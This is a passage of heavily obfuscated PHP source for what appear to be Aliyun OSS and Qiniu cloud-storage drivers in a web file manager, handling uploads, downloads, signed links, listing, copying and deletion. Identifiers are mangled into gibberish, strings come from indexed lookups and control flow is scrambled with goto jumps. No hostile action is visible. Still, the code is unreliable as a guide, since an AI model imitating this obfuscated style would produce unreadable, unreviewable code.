(isset($Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[221]])) { $Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[220]] = $C®¿ë·ÍçÂ; return $this->listUploadParts($eõÏƒĞäµ, $Få½áåÕ’); } goto e¹ƒ…ùòİ; FÏ‘Æª†’: $EŸ³ÄïÀ÷ˆ =& $_SERVER[Æ¼ôºÙï]; $C®¿ë·ÍçÂ = isset($Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[220]]) ? $Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[220]] : gmdate($EŸ³ÄïÀ÷ˆ[1271]); $C„ˆº½®Ç = isset($Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[167]]) ? $Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[167]] : $EŸ³ÄïÀ÷ˆ[33]; goto B³åö¼Å÷; dÉ°«òãÖ×: } public function listUploadParts($fê¬·±‚ö’, $E¬Š‰÷¯’) { goto D³ÉÎ„­á; DÁ¶ÓÀ´¤×: $f´±Šó†íß = $F§ùªŒŞŸ«->getListPart(); $c¤¤ÁØ‘–– = array(); foreach ($f´±Šó†íß as $e®™ƒÉ«ê) { $c¤¤ÁØ‘––[] = array($C°¡§ÙÃĞ¤[1256] => $e®™ƒÉ«ê->getPartNumber(), $C°¡§ÙÃĞ¤[1257] => trim($e®™ƒÉ«ê->getETag(), $C°¡§ÙÃĞ¤[115])); } goto DßÄ–ÅÕÖö; F’ÊèÍ¹¯£: return array($C°¡§ÙÃĞ¤[230] => $açáµĞ§, $C°¡§ÙÃĞ¤[220] => $E¬Š‰÷¯’[$C°¡§ÙÃĞ¤[220]], $C°¡§ÙÃĞ¤[232] => $c¤¤ÁØ‘––); goto E÷‡½§óé; DßÄ–ÅÕÖö: unset($E¬Š‰÷¯’[$C°¡§ÙÃĞ¤[221]], $E¬Š‰÷¯’[$C°¡§ÙÃĞ¤[225]]); $açáµĞ§ = $this->multiUploadAuthData($fê¬·±‚ö’, $E¬Š‰÷¯’); if (empty($açáµĞ§)) { return !1; } goto F’ÊèÍ¹¯£; D³ÉÎ„­á: $C°¡§ÙÃĞ¤ =& $_SERVER[Æ¼ôºÙï]; $EÀáâ¡–œ© = parse_url_query($E¬Š‰÷¯’[$C°¡§ÙÃĞ¤[167]]); $F§ùªŒŞŸ« = $this->client->listParts($this->bucket, $this->pathEncode($fê¬·±‚ö’), $EÀáâ¡–œ©[$C°¡§ÙÃĞ¤[219]]); goto DÁ¶ÓÀ´¤×; E÷‡½§óé: } public function download($eê£çäÑ¿£, $f®óˆºÄí) { if ($this->isFolder($eê£çäÑ¿£)) { return !1; } try { $aôÜååŒÛÉ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $f®óˆºÄí); $aôÜååŒÛÉ = $this->trafficLimit($_SERVER[Æ¼ôºÙï][108], $aôÜååŒÛÉ); $this->client->getObject($this->bucket, $this->pathEncode($eê£çäÑ¿£), $aôÜååŒÛÉ); } catch (OSS\Core\OssException $fğ­ø‘¤Á) { return !1; } return $f®óˆºÄí; } public function fileSubstr($B¦Ûª³‡Œò, $eœÛ³¦‡¥ = 0, $dÍ»Ç»°†¦ = false) { if ($eœÛ³¦‡¥ === -1) { $bëóÅóß•Š = array(); } else { if ($dÍ»Ç»°†¦ === !1) { $Dğ¯’£İã = $this->size($B¦Ûª³‡Œò); } else { $Dğ¯’£İã = $eœÛ³¦‡¥ + $dÍ»Ç»°†¦ - 1; } $bëóÅóß•Š = array(OSS\OssClient::OSS_RANGE => "{$eœÛ³¦‡¥}\x2d{$Dğ¯’£İã}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($B¦Ûª³‡Œò), $bëóÅóß•Š); } catch (OSS\Core\OssException $b³‹‡éİˆî) { think_exception($b³‹‡éİˆî->getMessage()); return !1; } } private function trafficLimit($c•¯™ƒÒÅ, $f£°ğ‡¾¾ = array()) { goto aˆ¢éª§“°; Fó¶°¹÷«¦: return $f£°ğ‡¾¾; goto FùÌ±’ìôí; eŒ”İ–çÀÉ: if (!$c¿™Ÿ¶“İ) { return $f£°ğ‡¾¾; } $c¿™Ÿ¶“İ = $c¿™Ÿ¶“İ < 819200 ? 819200 : ($c¿™Ÿ¶“İ > 838860800 ? 838860800 : $c¿™Ÿ¶“İ); $f£°ğ‡¾¾[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($c¿™Ÿ¶“İ); goto Fó¶°¹÷«¦; aˆ¢éª§“°: $c¾ØÒ¹´ =& $_SERVER[Æ¼ôºÙï]; if ($c•¯™ƒÒÅ == $c¾ØÒ¹´[1263] && $this->isUploadServer() || $c•¯™ƒÒÅ == $c¾ØÒ¹´[108] && $this->isFileOutServer()) { return $f£°ğ‡¾¾; } $c¿™Ÿ¶“İ = floatval($GLOBALS[$c¾ØÒ¹´[6]][$c¾ØÒ¹´[87]][$c¾ØÒ¹´[106]][$c•¯™ƒÒÅ]) * 1024 * 1024 * 8; goto eŒ”İ–çÀÉ; FùÌ±’ìôí: } public function link($A™²À×Ìè, $dÇ´„ÈÊêÊ = array()) { $eÜëÑßŞ± =& $_SERVER[Æ¼ôºÙï]; if (!$this->exist($A™²À×Ìè) || $this->isFolder($A™²À×Ìè)) { return !1; } try { $dÇ´„ÈÊêÊ = $this->trafficLimit($eÜëÑßŞ±[108], $dÇ´„ÈÊêÊ); $EÁ¤ÊŸº‡Õ = $this->client->signUrl($this->bucket, $this->pathEncode($A™²À×Ìè), 3600 * 12, $eÜëÑßŞ±[226], $dÇ´„ÈÊêÊ); return $this->getCdnLink($EÁ¤ÊŸº‡Õ); } catch (OSS\Core\OssException $d¹ÃÕ•¾÷) { return !1; } } public function fileOut($fçâêáì‹Ñ, $c…ñ¾Œ¤½Ä = false, $EÔÈ²¾¤’ = false, $a†îÖŠç©± = '') { goto eˆŠë±» ; eˆŠë±» : $c¼¼í½ÁÃ =& $_SERVER[Æ¼ôºÙï]; if ($this->isFileOutServer()) { return $this->fileOutServer($fçâêáì‹Ñ, $c…ñ¾Œ¤½Ä, $EÔÈ²¾¤’, $a†îÖŠç©±); } if (!$EÔÈ²¾¤’) { $EÔÈ²¾¤’ = $this->pathThis($fçâêáì‹Ñ); } goto b­÷…ùù½; CÛ®ç»çŸ: $c…ñ¾Œ¤½Ä = $c…ñ¾Œ¤½Ä ? $c¼¼í½ÁÃ[212] : $c¼¼í½ÁÃ[213]; $aÊÊÍğ¨¡Ç = array(OSS\OssClient::OSS_SUB_RESOURCE => $c¼¼í½ÁÃ[1274] . rawurlencode("{$c…ñ¾Œ¤½Ä}\x3b\x66\151\x6c\145\156\x61\155\x65\75{$EÔÈ²¾¤’}")); $aÊÊÍğ¨¡Ç[OSS\OssClient::OSS_SUB_RESOURCE] .= $c¼¼í½ÁÃ[1275] . rawurlencode($E¿ ³á—¶); goto eÁÂÜ‘õï¹; eÁÂÜ‘õï¹: $f÷“Ò´­×¬ = $this->link($fçâêáì‹Ñ, $aÊÊÍğ¨¡Ç); $this->fileOutLink($f÷“Ò´­×¬); goto dä’°Æ; b­÷…ùù½: $EÔÈ²¾¤’ = rawurlencode($EÔÈ²¾¤’); $E¿ ³á—¶ = get_file_mime(get_path_ext($EÔÈ²¾¤’)); if ($E¿ ³á—¶ == $c¼¼í½ÁÃ[211]) { return parent::fileOut($fçâêáì‹Ñ, $c…ñ¾Œ¤½Ä, $EÔÈ²¾¤’, $a†îÖŠç©±); } goto CÛ®ç»çŸ; dä’°Æ: } public function fileOutServer($B²‡„½ò‹ô, $EÄó¿…ŠÄÄ = false, $a§Œ™ÆÍÑ¾ = false, $b·¿ã Ï« = '') { parent::fileOut($B²‡„½ò‹ô, $EÄó¿…ŠÄÄ, $a§Œ™ÆÍÑ¾, $b·¿ã Ï«); } public function fileOutImage($BÉ÷ö–ª™‡, $A«³£‘é‰É = 250) { $aÄ„Ù“«¥¦ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Æ¼ôºÙï][1276] . $A«³£‘é‰É); $dß½¼ã‰¹í = $this->link($BÉ÷ö–ª™‡, $aÄ„Ù“«¥¦); $this->fileOutLink($dß½¼ã‰¹í); } public function fileOutImageServer($Cœä÷«Ææ, $E†„×Æ½Üƒ = 250) { parent::fileOutImage($Cœä÷«Ææ, $E†„×Æ½Üƒ); } public function fileOutLink($A¿ÑİÎÃ‘) { $A‘ßƒ³‡ĞÂ =& $_SERVER[Æ¼ôºÙï]; if (!$this->isCdnHost() && substr($A¿ÑİÎÃ‘, 0, 7) == $A‘ßƒ³‡ĞÂ[1180]) { $A¿ÑİÎÃ‘ = $A‘ßƒ³‡ĞÂ[1181] . substr($A¿ÑİÎÃ‘, 7); } header($A‘ßƒ³‡ĞÂ[158] . $A¿ÑİÎÃ‘); die; } public function hashMd5($E¾©†Ø£ù, $f’ñ‘†ã’¸ = '') { $bˆÄßôƒî =& $_SERVER[Æ¼ôºÙï]; $CÕÍèëÂ„ = $this->_objectMeta($E¾©†Ø£ù); if (!$CÕÍèëÂ„) { return $bˆÄßôƒî[33]; } if (!isset($CÕÍèëÂ„[$bˆÄßôƒî[1252]]) && !empty($f’ñ‘†ã’¸)) { $EÀ¡¢²Êá = $this->updateObjMeta($E¾©†Ø£ù, array($bˆÄßôƒî[1252] => $f’ñ‘†ã’¸)); $CÕÍèëÂ„[$bˆÄßôƒî[1252]] = $EÀ¡¢²Êá ? $f’ñ‘†ã’¸ : $bˆÄßôƒî[33]; } return isset($CÕÍèëÂ„[$bˆÄßôƒî[1252]]) ? strtolower($CÕÍèëÂ„[$bˆÄßôƒî[1252]]) : $bˆÄßôƒî[33]; } public function size($C³Í–—) { $f²£á†Ğ¯ = $this->objectMeta($C³Í–—); return $f²£á†Ğ¯ ? $f²£á†Ğ¯[$_SERVER[Æ¼ôºÙï][77]] : 0; } public function info($C¦‡ñô‡êá) { if ($this->isFolder($C¦‡ñô‡êá)) { return $this->folderInfo($C¦‡ñô‡êá); } else { if ($this->isFile($C¦‡ñô‡êá)) { return $this->fileInfo($C¦‡ñô‡êá); } } return !1; } public function exist($C†Ó¾½›ò«) { return $this->isFile($C†Ó¾½›ò«) || $this->isFolder($C†Ó¾½›ò«); } public function isFile($f¹««±²‚Æ) { return !$this->isFolder($f¹««±²‚Æ) && $this->objectMeta($f¹««±²‚Æ); } public function isFolder($bê¢¸ê´¡¦) { return $this->cacheMethod($_SERVER[Æ¼ôºÙï][197], $bê¢¸ê´¡¦); } protected function objectMeta($eĞŠÍÏÙĞº) { return $this->cacheMethod($_SERVER[Æ¼ôºÙï][198], $eĞŠÍÏÙĞº); } protected function _objectMeta($f¥ˆÔÕŠèÙ) { $dŠ¤»ùŸŞ× =& $_SERVER[Æ¼ôºÙï]; try { $bØ×¶‹–¼Ò = $this->client->getObjectMeta($this->bucket, $this->pathEncode($f¥ˆÔÕŠèÙ)); } catch (OSS\Core\OssException $Cñ¶ƒ¿ì•) { $bØ×¶‹–¼Ò = !1; } if ($bØ×¶‹–¼Ò) { $bØ×¶‹–¼Ò[$dŠ¤»ùŸŞ×[77]] = intval($bØ×¶‹–¼Ò[$dŠ¤»ùŸŞ×[1250]]); } return $bØ×¶‹–¼Ò; } protected function _isFolder($a£Ú‰ß›ƒ˜) { $b¾¤Ê¯ÑÖì =& $_SERVER[Æ¼ôºÙï]; if ($a£Ú‰ß›ƒ˜ == $b¾¤Ê¯ÑÖì[33] || $a£Ú‰ß›ƒ˜ == $b¾¤Ê¯ÑÖì[8]) { return !0; } $CÄ³Î‚Æø‚ = array($b¾¤Ê¯ÑÖì[1246] => $b¾¤Ê¯ÑÖì[8], $b¾¤Ê¯ÑÖì[1247] => rtrim($a£Ú‰ß›ƒ˜, $b¾¤Ê¯ÑÖì[8]) . $b¾¤Ê¯ÑÖì[8], $b¾¤Ê¯ÑÖì[1248] => 1, $b¾¤Ê¯ÑÖì[1249] => $b¾¤Ê¯ÑÖì[33]); $cÓ‚‚â¾ = $this->client->listObjects($this->bucket, $CÄ³Î‚Æø‚); if ($cÓ‚‚â¾->getObjectList() || $cÓ‚‚â¾->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($FĞÖóÑ¯ª) { parent::__construct(); require_once SDK_DIR . $_SERVER[Æ¼ôºÙï][1277]; $this->_init($FĞÖóÑ¯ª); } public function _init($dÏ© ²·Ó) { goto cˆ‘»í© ; e†……Ç®‘ä: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto d°ºµë½á¦; cˆ‘»í© : $aÒ’¥—‹ì =& $_SERVER[Æ¼ôºÙï]; foreach ($dÏ© ²·Ó as $B°—˜¿¢Åä => $F“­¹Ô±ç) { if (isset($this->{$B°—˜¿¢Åä})) { $this->{$B°—˜¿¢Åä} = $F“­¹Ô±ç; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($aÒ’¥—‹ì[1278] . LNG($aÒ’¥—‹ì[1237])); } goto e†……Ç®‘ä; d°ºµë½á¦: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto cùò‡Ÿª‡É; cùò‡Ÿª‡É: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($E°ˆñ®¬„°, $b°¦İ ©–¥ = '', $FŠóŒìÚòõ = REPEAT_RENAME) { if ($this->setContent($E°ˆñ®¬„°, $b°¦İ ©–¥)) { return $this->getPathOuter($E°ˆñ®¬„°); } return !1; } public function mkdir($c·–Ì‡÷Øõ, $DòŒ×½ñ = REPEAT_SKIP) { goto A÷‹İ®¥—Õ; aÜÖÜ‚¹: if (!$this->mkfile($cƒ›Ê­ë†)) { return !1; } if (!$this->moveFile($cƒ›Ê­ë†, $c·–Ì‡÷Øõ)) { $this->delFile($cƒ›Ê­ë†); return !1; } return $this->getPathOuter($AÛ¯ÜŒ‹); goto A¦ƒ°Ìª; c£˜™„÷¸: $c·–Ì‡÷Øõ = $AÛ¯ÜŒ‹ . $cÒÅÕµßö¨[8]; $cˆÅÜ¢‡¾ø = get_path_this($AÛ¯ÜŒ‹); $cƒ›Ê­ë† = $c·–Ì‡÷Øõ . $cˆÅÜ¢‡¾ø; goto aÜÖÜ‚¹; A÷‹İ®¥—Õ: $cÒÅÕµßö¨ =& $_SERVER[Æ¼ôºÙï]; $AÛ¯ÜŒ‹ = trim($c·–Ì‡÷Øõ, $cÒÅÕµßö¨[8]); if ($this->_isFolder($AÛ¯ÜŒ‹)) { return $this->getPathOuter($AÛ¯ÜŒ‹); } goto c£˜™„÷¸; A¦ƒ°Ìª: } public function copyFile($EÍö¥Ã‹—¿, $eåêæ‹ÚŠ) { $eğó¾ùŸ˜ = $this->bucketManager->copy($this->bucket, $EÍö¥Ã‹—¿, $this->bucket, $eåêæ‹ÚŠ, !0); return $eğó¾ùŸ˜ ? !1 : $this->getPathOuter($eåêæ‹ÚŠ); } public function moveFile($d›—‡ƒ¹ô, $bÉÎäš„Ñ) { $A‚ğÍñ‰§¹ = $this->bucketManager->move($this->bucket, $d›—‡ƒ¹ô, $this->bucket, $bÉÎäš„Ñ, !0); return $A‚ğÍñ‰§¹ ? !1 : $this->getPathOuter($bÉÎäš„Ñ); } public function delFile($B”“Ü¿‘šƒ) { if (!$this->exist($B”“Ü¿‘šƒ)) { return !0; } $B„¡¶ƒâ¹“ = $this->bucketManager->delete($this->bucket, $B”“Ü¿‘šƒ); return $B„¡¶ƒâ¹“ ? !1 : !0; } public function delFolder($b’åÀÛî³®) { goto CÁ¹±ù×È¥; aˆÂ Äˆà: $C¤¶ƒ‹¡¸á = $this->fileList($b’åÀÛî³®); $this->listItemCache = !0; $bİõèÇ¥Š = trim($b’åÀÛî³®, $a‹¡ãäÓ¼[8]) . $a‹¡ãäÓ¼[8]; goto dã´‘‚õéÉ; CÁ¹±ù×È¥: $a‹¡ãäÓ¼ =& $_SERVER[Æ¼ôºÙï]; if (!$this->exist($b’åÀÛî³®)) { return !0; } $this->listItemCache = !1; goto aˆÂ Äˆà; eÉÍ¦®­: return $this->delByBatch($C¤¶ƒ‹¡¸á[$a‹¡ãäÓ¼[74]]); goto dÜËÕÃ»ò; dã´‘‚õéÉ: if (!empty($b’åÀÛî³®) && !in_array($bİõèÇ¥Š, $C¤¶ƒ‹¡¸á[$a‹¡ãäÓ¼[74]])) { $C¤¶ƒ‹¡¸á[$a‹¡ãäÓ¼[74]][] = $bİõèÇ¥Š; } $AÒâñÊî½£ = $this->delByBatch($C¤¶ƒ‹¡¸á[$a‹¡ãäÓ¼[73]]); if (!$AÒâñÊî½£) { return !1; } goto eÉÍ¦®­; dÜËÕÃ»ò: } private function delByBatch($c¤Ã–ÏËÅ‘) { foreach (array_chunk($c¤Ã–ÏËÅ‘, 1000) as $EÅÔœ´‰Œƒ) { $A•Ò‡ ²ˆ = $this->bucketManager->buildBatchDelete($this->bucket, $EÅÔœ´‰Œƒ); list($c²¬Ø¼„†Â, $fÃáù•Ã“Ö) = $this->bucketManager->batch($A•Ò‡ ²ˆ); if ($fÃáù•Ã“Ö) { return !1; } } return !0; } public function rename($EòÛ¦ÃïÍ±, $Cˆ·åéòì) { return $this->renameObject($EòÛ¦ÃïÍ±, $Cˆ·åéòì); } public function fileInfo($F¡‚è¥ëæ¤, $AöÉÁØ—³Æ = false, $cÎå·°Æ¦ = array()) { goto Aˆ¼áœêˆ°; Aˆ¼áœêˆ°: $eØñµµÄÀ =& $_SERVER[Æ¼ôºÙï]; $e®º¡œ¡§ = array($eØñµµÄÀ[28] => $this->pathThis($F¡‚è¥ëæ¤), $eØñµµÄÀ[75] => $this->getPathOuter($eØñµµÄÀ[8] . $F¡‚è¥ëæ¤), $eØñµµÄÀ[29] => $eØñµµÄÀ[173], $eØñµµÄÀ[77] => isset($cÎå·°Æ¦[$eØñµµÄÀ[1279]]) ? $cÎå·°Æ¦[$eØñµµÄÀ[1279]] : 0, $eØñµµÄÀ[167] => $this->ext($F¡‚è¥ëæ¤)); if ($AöÉÁØ—³Æ) { return $e®º¡œ¡§; } goto b±’“øµŒó; b±’“øµŒó: $e®º¡œ¡§[$eØñµµÄÀ[192]] = $e®º¡œ¡§[$eØñµµÄÀ[83]] = 0; $e®º¡œ¡§[$eØñµµÄÀ[193]] = $e®º¡œ¡§[$eØñµµÄÀ[194]] = !0; if (empty($cÎå·°Æ¦)) { $cÎå·°Æ¦ = $this->objectMeta($F¡‚è¥ëæ¤); if (!$cÎå·°Æ¦) { return $e®º¡œ¡§; } } goto b¦ µ§°İ¥; b¦ µ§°İ¥: if (isset($cÎå·°Æ¦[$eØñµµÄÀ[1280]])) { $e®º¡œ¡§[$eØñµµÄÀ[83]] = substr($cÎå·°Æ¦[$eØñµµÄÀ[1280]] . $eØñµµÄÀ[33], 0, 10); } if (isset($cÎå·°Æ¦[$eØñµµÄÀ[1279]])) { $e®º¡œ¡§[$eØñµµÄÀ[77]] = $cÎå·°Æ¦[$eØñµµÄÀ[1279]]; } return $e®º¡œ¡§; goto DäÜœáÉŞò; DäÜœáÉŞò: } public function folderInfo($B‰Ş­éŠ©, $B—Üñ£Ï§Å = false) { goto dÖ“†Á……í; dÖ“†Á……í: $BçËï¯÷¢Ô =& $_SERVER[Æ¼ôºÙï]; $fïçÀÎã° = array($BçËï¯÷¢Ô[28] => $this->pathThis($B‰Ş­éŠ©), $BçËï¯÷¢Ô[75] => $this->getPathOuter($BçËï¯÷¢Ô[8] . $B‰Ş­éŠ©), $BçËï¯÷¢Ô[29] => $BçËï¯÷¢Ô[76]); if ($B—Üñ£Ï§Å) { return $fïçÀÎã°; } goto ešºŞŒËçì; ešºŞŒËçì: $fïçÀÎã°[$BçËï¯÷¢Ô[192]] = $fïçÀÎã°[$BçËï¯÷¢Ô[83]] = 0; $fïçÀÎã°[$BçËï¯÷¢Ô[193]] = $fïçÀÎã°[$BçËï¯÷¢Ô[194]] = !0; $B‰Ş­éŠ© = rtrim($B‰Ş­éŠ©, $BçËï¯÷¢Ô[8]) . $BçËï¯÷¢Ô[8]; goto Bò°Ù’³°; Bò°Ù’³°: $dá¦×ô¤Ç = $this->objectMeta($B‰Ş­éŠ©); if (isset($dá¦×ô¤Ç[$BçËï¯÷¢Ô[1280]])) { $fïçÀÎã°[$BçËï¯÷¢Ô[83]] = substr($dá¦×ô¤Ç[$BçËï¯÷¢Ô[1280]] . $BçËï¯÷¢Ô[33], 0, 10); } return $fïçÀÎã°; goto D‘Õ”ê¾; D‘Õ”ê¾: } public function listPath($F›‡÷‡ÎÚ, $FÒ‚‹µÁÛ¾ = false) { $A™òáÚ›‹ =& $_SERVER[Æ¼ôºÙï]; $FÀíÓŞ©ŸÈ = $this->fileList($F›‡÷‡ÎÚ, $A™òáÚ›‹[8], !0); foreach ($FÀíÓŞ©ŸÈ[$A™òáÚ›‹[74]] as $Fê ´¿‰ó½ => $bšŠÌ¡ÁÙ) { $FÀíÓŞ©ŸÈ[$A™òáÚ›‹[74]][$Fê ´¿‰ó½] = $this->folderInfo($bšŠÌ¡ÁÙ, $FÒ‚‹µÁÛ¾); } foreach ($FÀíÓŞ©ŸÈ[$A™òáÚ›‹[73]] as $Fê ´¿‰ó½ => $bšŠÌ¡ÁÙ) { $FÀíÓŞ©ŸÈ[$A™òáÚ›‹[73]][$Fê ´¿‰ó½] = $this->fileInfo($bšŠÌ¡ÁÙ[$A™òáÚ›‹[92]], $FÒ‚‹µÁÛ¾, $bšŠÌ¡ÁÙ); } return $FÀíÓŞ©ŸÈ; } public function has($aªÖíÉÊ¹ä, $B¨Òëù‰„á = false, $bÚ§î“£¾ = true) { goto f„×¥Œ Šï; bÇà¤çÂ¢³: return !1; goto aŠ‹ñÄ×÷³; f„×¥Œ Šï: $D“Òª±Ò‚Ã =& $_SERVER[Æ¼ôºÙï]; $aªÖíÉÊ¹ä = trim($aªÖíÉÊ¹ä, $D“Òª±Ò‚Ã[8]); $f¤ñÁ¬Ñ…Š = empty($aªÖíÉÊ¹ä) ? $D“Òª±Ò‚Ã[33] : $aªÖíÉÊ¹ä . $D“Òª±Ò‚Ã[8]; goto e‹ˆÌç º; e‹ˆÌç º: $FŸ£ °˜±õ = $D“Òª±Ò‚Ã[33]; $FÀŞí«Ÿåà = 500; $F½ÅŸƒ†ã = $D“Òª±Ò‚Ã[8]; goto c—‘æ¸§œ; c—‘æ¸§œ: $A•äš¨Á = $f’³Ğ¹Â×Ï = 0; while (!0) { check_abort(); list($aÕğ“á«®, $FŸÙâæÙõÉ) = $this->bucketManager->listFiles($this->bucket, $f¤ñÁ¬Ñ…Š, $FŸ£ °˜±õ, $FÀŞí«Ÿåà, $F½ÅŸƒ†ã); if ($FŸÙâæÙõÉ) { break; } $FŸ£ °˜±õ = array_key_exists($D“Òª±Ò‚Ã[1249], $aÕğ“á«®) ? $FŸ£ °˜±õ = $aÕğ“á«®[$D“Òª±Ò‚Ã[1281]] : $D“Òª±Ò‚Ã[33]; if ($B¨Òëù‰„á) { if (!empty($aÕğ“á«®[$D“Òª±Ò‚Ã[1282]])) { $A•äš¨Á += count($aÕğ“á«®[$D“Òª±Ò‚Ã[1282]]); } if (!empty($aÕğ“á«®[$D“Òª±Ò‚Ã[1283]])) { $f’³Ğ¹Â×Ï += count($aÕğ“á«®[$D“Òª±Ò‚Ã[1283]]); } if ($FŸ£ °˜±õ === $D“Òª±Ò‚Ã[33]) { break; } continue; } if ($bÚ§î“£¾) { if (!empty($aÕğ“á«®[$D“Òª±Ò‚Ã[1282]])) { return !0; } } else { if (!empty($aÕğ“á«®[$D“Òª±Ò‚Ã[1283]])) { return !0; } } if ($FŸ£ °˜±õ === $D“Òª±Ò‚Ã[33]) { break; } } if ($B¨Òëù‰„á) { return array($D“Òª±Ò‚Ã[201] => $A•äš¨Á, $D“Òª±Ò‚Ã[202] => $f’³Ğ¹Â×Ï); } goto bÇà¤çÂ¢³; aŠ‹ñÄ×÷³: } public function listAll($cÚˆ¬·”¢†) { $b¥ÌåøÎÉÀ =& $_SERVER[Æ¼ôºÙï]; $dÛ­š°•Ë = $this->fileList($cÚˆ¬·”¢†, $b¥ÌåøÎÉÀ[33], !0); $F’Îİò‚‹ = array(); foreach ($dÛ­š°•Ë[$b¥ÌåøÎÉÀ[73]] as $DÀ¿›ÀŞË) { $F’Îİò‚‹[$DÀ¿›ÀŞË[$b¥ÌåøÎÉÀ[92]]] = $DÀ¿›ÀŞË[$b¥ÌåøÎÉÀ[77]]; } foreach ($dÛ­š°•Ë[$b¥ÌåøÎÉÀ[74]] as $DÀ¿›ÀŞË) { if (is_string($DÀ¿›ÀŞË)) { $F’Îİò‚‹[$DÀ¿›ÀŞË] = 0; } } return $this->listAllFiles($cÚˆ¬·”¢†, array_keys($F’Îİò‚‹), $F’Îİò‚‹); } private function fileList($C±¯ë£®ê, $cè¨£Ø¬‚ = '', $F²²ÈÍ¡áÉ = 0) { goto E˜æÔë¿º‰; E˜æÔë¿º‰: $CÄ»Šè×Ù =& $_SERVER[Æ¼ôºÙï]; $C±¯ë£®ê = trim($C±¯ë£®ê, $CÄ»Šè×Ù[8]); $d…ìîóÇ…Ø = empty($C±¯ë£®ê) ? $CÄ»Šè×Ù[33] : $C±¯ë£®ê . $CÄ»Šè×Ù[8]; goto BƒÒÜÉÛ; bâà§ÂÔè: $bªè¶Û¥ğÈ = $bİê¤ì…Ğê = array(); while (!0) { check_abort(); list($Cæ£Ğ¬”‹é, $CÒãŠİö…¡) = $this->bucketManager->listFiles($this->bucket, $d…ìîóÇ…Ø, $eïå±·„¼Œ, $DÎáŞ˜Ìˆø, $cè¨£Ø¬‚); if ($CÒãŠİö…¡) { break; } $eïå±·„¼Œ = array_key_exists($CÄ»Šè×Ù[1249], $Cæ£Ğ¬”‹é) ? $eïå±·„¼Œ = $Cæ£Ğ¬”‹é[$CÄ»Šè×Ù[1281]] : $CÄ»Šè×Ù[33]; $E›Æ¦•°»× = isset($Cæ£Ğ¬”‹é[$CÄ»Šè×Ù[1282]]) ? $Cæ£Ğ¬”‹é[$CÄ»Šè×Ù[1282]] : array(); $b†›ŸÖéİ = isset($Cæ£Ğ¬”‹é[$CÄ»Šè×Ù[1283]]) ? $Cæ£Ğ¬”‹é[$CÄ»Šè×Ù[1283]] : array(); foreach ($E›Æ¦•°»× as $C¬È•Âğ”Ä) { goto FËŠ–±Èêï; cˆñèÓ’í‚: $C¬È•Âğ”Ä[$CÄ»Šè×Ù[77]] = $DĞÌÀßè°; $E½î¢ÄÎ«½ = $DĞÌÀßè° == 0 && substr($AïåÈå†Œ¼, strlen($AïåÈå†Œ¼) - 1, 1) == $CÄ»Šè×Ù[8] ? !0 : !1; if ($F«§ˆÚñ•) { $this->cacheMethod($CÄ»Šè×Ù[197], $AïåÈå†Œ¼, $E½î¢ÄÎ«½); $this->cacheMethod($CÄ»Šè×Ù[198], $AïåÈå†Œ¼, $C¬È•Âğ”Ä); } goto dµÉÏáÂµ­; dµÉÏáÂµ­: if ($E½î¢ÄÎ«½) { $bªè¶Û¥ğÈ[] = $AïåÈå†Œ¼; continue; } $bİê¤ì…Ğê[] = $F²²ÈÍ¡áÉ ? $C¬È•Âğ”Ä : $AïåÈå†Œ¼; goto aÇ…»ğ×½®; FËŠ–±Èêï: if ($C¬È•Âğ”Ä[$CÄ»Šè×Ù[92]] == $d…ìîóÇ…Ø) { continue; } $AïåÈå†Œ¼ = $C¬È•Âğ”Ä[$CÄ»Šè×Ù[92]]; $DĞÌÀßè° = $C¬È•Âğ”Ä[$CÄ»Šè×Ù[1279]]; goto cˆñèÓ’í‚; aÇ…»ğ×½®: } foreach ($b†›ŸÖéİ as $AïåÈå†Œ¼) { if ($AïåÈå†Œ¼ == $d…ìîóÇ…Ø) { continue; } $bªè¶Û¥ğÈ[] = $AïåÈå†Œ¼; if ($F«§ˆÚñ•) { $this->cacheMethod($CÄ»Šè×Ù[197], $AïåÈå†Œ¼, !0); } } if ($eïå±·„¼Œ === $CÄ»Šè×Ù[33]) { break; } } if ($F«§ˆÚñ•) { $this->cacheMethod($CÄ»Šè×Ù[197], $C±¯ë£®ê, !0); } goto C±º¶ š©Ò; BƒÒÜÉÛ: $eïå±·„¼Œ = $CÄ»Šè×Ù[33]; $DÎáŞ˜Ìˆø = 1000; $F«§ˆÚñ• = $this->listItemCache === !1 ? !1 : !0; goto bâà§ÂÔè; C±º¶ š©Ò: return array($CÄ»Šè×Ù[74] => $bªè¶Û¥ğÈ, $CÄ»Šè×Ù[73] => $bİê¤ì…Ğê); goto Bî¨µ£Ó·ë; Bî¨µ£Ó·ë: } public function canRead($b¥´ò³ì²í) { return $this->exist($b¥´ò³ì²í) ? !0 : !1; } public function canWrite($f‡Ÿ¥™µˆ) { return $this->exist($f‡Ÿ¥™µˆ) ? !0 : !1; } public function getContent($b†‰â›ˆ®Ú) { return $this->fileSubstr($b†‰â›ˆ®Ú, 0, -1); } public function setContent($eØ½‡¼·÷¤, $EÖ‡Õ±³‡Å = '') { $aø­å„»Ç“ = $this->tempFile($this->pathThis($eØ½‡¼·÷¤)); file_put_contents($aø­å„»Ç“, $EÖ‡Õ±³‡Å); if ($this->upload($eØ½‡¼·÷¤, $aø­å„»Ç“)) { $this->tempFileRemve($aø­å„»Ç“); return !0; } return !1; } public function refreshUrls($DÒÓôá­Î¦) { goto C‚º»Õæ“³; C‚º»Õæ“³: $a¢¨óù²Ç =& $_SERVER[Æ¼ôºÙï]; $aÑŠ«ªˆ¡¡ = array(); if 